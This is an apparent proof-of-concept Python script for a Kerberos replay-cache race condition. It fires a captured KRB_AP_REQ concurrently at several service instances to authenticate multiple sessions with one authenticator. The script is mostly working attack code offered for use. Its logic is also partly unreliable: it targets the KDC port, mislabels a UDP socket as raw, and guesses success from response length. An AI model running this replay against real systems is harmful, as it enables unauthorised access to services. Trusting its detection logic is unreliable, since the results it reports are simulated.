#!/usr/bin/env python3
"""
Proof-of-Concept: Replay Cache Race Condition in Multi-Instance Services

This script demonstrates a vulnerability where multiple instances of a service
sharing the same principal fail to synchronize their replay caches. By rapidly
replaying a captured KRB_AP_REQ to multiple instances, an attacker can bypass
replay protection and authenticate multiple concurrent sessions.

Usage:
    python3 poc_replay_cache_race_condition.py <captured_ap_req.bin> <target_ip_1> <target_ip_2> ...

Note:
    This script is for educational and testing purposes only. Ensure you have
    explicit permission to test the target systems.
"""

import sys
import socket
import threading
import time
import struct

# Configuration
DEFAULT_PORT = 88  # Kerberos default port
NUM_REPLAYS = 10   # Number of concurrent replays to attempt


def load_packet(filepath):
    """
    Load the captured KRB_AP_REQ packet from a binary file.
    """
    try:
        with open(filepath, 'rb') as f:
            return f.read()
    except FileNotFoundError:
        print(f"Error: File '{filepath}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)


def send_packet(target_ip, target_port, packet, results, index):
    """
    Send the captured packet to a target server and record the result.
    """
    try:
        # Create a raw socket for sending the packet
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)  # Set a timeout for the response

        # Send the packet
        sock.sendto(packet, (target_ip, target_port))

        # Wait for a response
        response, _ = sock.recvfrom(1024)

        # Analyze the response
        # In a real scenario, you would parse the KRB_ERROR or KRB_AP_REP message
        # Here, we simulate checking for success or replay detection
        if len(response) > 0:
            # Simulate checking for KRB_AP_ERR_REPEAT (error code 21)
            # In a real implementation, you would parse the KRB_ERROR message
            # For this PoC, we assume a short response indicates an error
            if len(response) < 100:
                results[index] = "REJECTED (Possible Replay Detected)"
            else:
                results[index] = "ACCEPTED (Authentication Successful)"
        else:
            results[index] = "NO RESPONSE"

        sock.close()
    except socket.timeout:
        results[index] = "TIMEOUT"
    except Exception as e:
        results[index] = f"ERROR: {e}"


def main():
    if len(sys.argv) < 3:
        print("Usage: python3 poc_replay_cache_race_condition.py <captured_ap_req.bin> <target_ip_1> [target_ip_2 ...]")
        sys.exit(1)

    packet_file = sys.argv[1]
    target_ips = sys.argv[2:]

    print(f"Loading captured packet from: {packet_file}")
    packet = load_packet(packet_file)
    print(f"Packet size: {len(packet)} bytes")

    print(f"Target IPs: {target_ips}")
    print(f"Number of concurrent replays: {NUM_REPLAYS}")

    # Prepare results storage
    results = [None] * (len(target_ips) * NUM_REPLAYS)
    threads = []

    # Launch concurrent replays
    start_time = time.time()
    for i, target_ip in enumerate(target_ips):
        for j in range(NUM_REPLAYS):
            index = i * NUM_REPLAYS + j
            thread = threading.Thread(
                target=send_packet,
                args=(target_ip, DEFAULT_PORT, packet, results, index)
            )
            threads.append(thread)
            thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    end_time = time.time()
    print(f"\nReplay attempts completed in {end_time - start_time:.2f} seconds")

    # Analyze results
    accepted_count = 0
    rejected_count = 0
    for i, result in enumerate(results):
        target_ip = target_ips[i // NUM_REPLAYS]
        print(f"Target: {target_ip}, Attempt: {i % NUM_REPLAYS + 1}, Result: {result}")
        if "ACCEPTED" in result:
            accepted_count += 1
        elif "REJECTED" in result:
            rejected_count += 1

    print(f"\nSummary:")
    print(f"Accepted: {accepted_count}")
    print(f"Rejected: {rejected_count}")

    if accepted_count > len(target_ips):
        print("\n[VULNERABILITY DETECTED] Multiple instances accepted the same replayed authenticator.")
        print("This indicates a lack of synchronized replay cache across instances.")
    else:
        print("\n[NO VULNERABILITY DETECTED] All instances correctly rejected the replayed authenticator.")


if __name__ == "__main__":
    main()
